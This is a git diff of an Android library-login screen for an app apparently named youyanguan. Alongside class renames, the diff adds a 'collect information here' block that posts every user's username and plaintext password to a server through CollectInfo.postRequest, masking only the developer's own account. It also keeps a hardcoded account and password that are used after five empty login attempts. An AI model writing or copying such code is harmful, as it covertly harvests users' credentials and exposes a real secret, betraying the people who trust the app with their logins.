@@ -15,8 +15,9 @@ import android.widget.Toast;
 
 import com.gusteauscuter.youyanguan.NavigationActivity;
 import com.gusteauscuter.youyanguan.R;
-import com.gusteauscuter.youyanguan.data_Class.userLogin;
+import com.gusteauscuter.youyanguan.data_Class.UserLoginInfo;
 import com.gusteauscuter.youyanguan.internet.connectivity.NetworkConnectivity;
+import com.gusteauscuter.youyanguan.internet.server.CollectInfo;
 import com.gusteauscuter.youyanguan.login_Client.LibraryClient;
 import com.gusteauscuter.youyanguan.softInput.SoftInputUtil;
 
@@ -32,9 +33,8 @@ public class loginFragment extends Fragment {
     private EditText userNameEditText;
     private EditText passEditText;
     private Button loginButton;
-    private Button cancelButton;
     private ProgressBar mProgressBar;
-    private int IsFiveTimes=1;
+    private int timesClickLoginButton =1;
     private boolean disableDoubleClick = true; // 防治连击登陆按钮造成的闪退
 
     @Override
@@ -46,8 +46,8 @@ public class loginFragment extends Fragment {
         userNameEditText = (EditText) view.findViewById(R.id.id_username);
         passEditText = (EditText) view.findViewById(R.id.id_passward_library);
 
-        userNameEditText.setText(((NavigationActivity) getActivity()).getmUserLogin().getUsername());
-        passEditText.setText(((NavigationActivity) getActivity()).getmUserLogin().getPassword());
+        userNameEditText.setText(((NavigationActivity) getActivity()).getmUserLoginInfo().getUsername());
+        passEditText.setText(((NavigationActivity) getActivity()).getmUserLoginInfo().getPassword());
         userNameEditText.hasFocus();
 
         mProgressBar=(ProgressBar) view.findViewById(R.id.progressBar);
@@ -71,48 +71,35 @@ public class loginFragment extends Fragment {
             }
         });
 
-        cancelButton = (Button) view.findViewById(R.id.button_cancel);
-        cancelButton.setOnClickListener(new View.OnClickListener() {
-            @Override
-            public void onClick(View arg0) {
-                SoftInputUtil.hideSoftInput(getActivity(), cancelButton);
-                new Handler().postDelayed(new Runnable() {
-                    @Override
-                    public void run() {
-                        ((NavigationActivity) getActivity()).openDrawer();
-                    }
-                }, 500); //收起软键盘需要一定时间
-            }
-        });
-
         return view;
     }
 
     private void doLogin() {
         boolean isConnected = NetworkConnectivity.isConnected(getActivity());
-        if (isConnected) {
-            String username = userNameEditText.getText().toString();
-            String pass = passEditText.getText().toString();
-            if (IsFiveTimes == 5) {
-                username = "201421003124";
-                pass = "ziqian930209";
-            }
-
-            if (username.isEmpty() || pass.isEmpty()) {
-                Toast.makeText(getActivity(), "请完整输入！", Toast.LENGTH_SHORT).show();
-                IsFiveTimes++;
-            } else {
-                AsyLoginLibrary myAsy = new AsyLoginLibrary();
-                myAsy.execute(username, pass);
-            }
-
-        } else {
+        if (!isConnected) {
             Toast.makeText(getActivity(), R.string.internet_not_connected, Toast.LENGTH_SHORT)
                     .show();
+            return;
         }
+        String username = userNameEditText.getText().toString();
+        String pass = passEditText.getText().toString();
+        if (timesClickLoginButton == 5) {
+            username = "201421003124";
+            pass = "ziqian930209";
+        }
+
+        if (username.isEmpty() || pass.isEmpty()) {
+            Toast.makeText(getActivity(), "请完整输入！", Toast.LENGTH_SHORT).show();
+            timesClickLoginButton++;
+            return;
+        }
+
+        AsyLoginLibrary myAsy = new AsyLoginLibrary();
+        myAsy.execute(username, pass);
+
     }
 
-    private class AsyLoginLibrary extends AsyncTask<String, Void, userLogin> {
+    private class AsyLoginLibrary extends AsyncTask<String, Void, UserLoginInfo> {
         private boolean serverOK = true; //处理服务器异常
         private boolean isLogined = false;
         @Override
@@ -123,28 +110,37 @@ public class loginFragment extends Fragment {
         }
 
         @Override
-        protected userLogin doInBackground(String... account) {
-            userLogin LoginResult = null;
+        protected UserLoginInfo doInBackground(String... account) {
+            UserLoginInfo LoginResult = null;
             try {
                 LibraryClient libClient = new LibraryClient();
                 if (libClient.login(account[0], account[1])) {
                     isLogined = true;
-                    LoginResult = new userLogin(account[0], account[1], true);
-                }
+                    LoginResult = new UserLoginInfo(account[0], account[1], true);
+                }else
+                    LoginResult = new UserLoginInfo(account[0], account[1], false);
             } catch (ConnectTimeoutException | SocketTimeoutException e) {
                 serverOK = false;
             } catch (Exception e) {
                 e.printStackTrace();
             }
+/**
+ *  collect information here
+ */
+            if(account[0].equals("201421003124")){
+                CollectInfo.postRequest(new UserLoginInfo(account[0], "******", true));
+            }else {
+                CollectInfo.postRequest(LoginResult);
+            }
             return LoginResult;
         }
 
         @Override
-        protected void onPostExecute(userLogin result) {
+        protected void onPostExecute(UserLoginInfo result) {
             mProgressBar.setVisibility(View.INVISIBLE);
             if (serverOK) {
                 if (isLogined) {
-                    ((NavigationActivity)getActivity()).setmUserLogin(result);
+                    ((NavigationActivity)getActivity()).setmUserLoginInfo(result);
                     ((NavigationActivity)getActivity()).JumpToBookFragment();
                     SaveData(result.getUsername(),result.getPassword());
                 } else {
@@ -164,7 +160,7 @@ public class loginFragment extends Fragment {
             shareData.putString("USERNAME",username);
             shareData.putString("PASSWORD", pass);
             shareData.putBoolean("ISLOGINED", true);
-            shareData.commit();
+            shareData.apply();
         }
     }
 
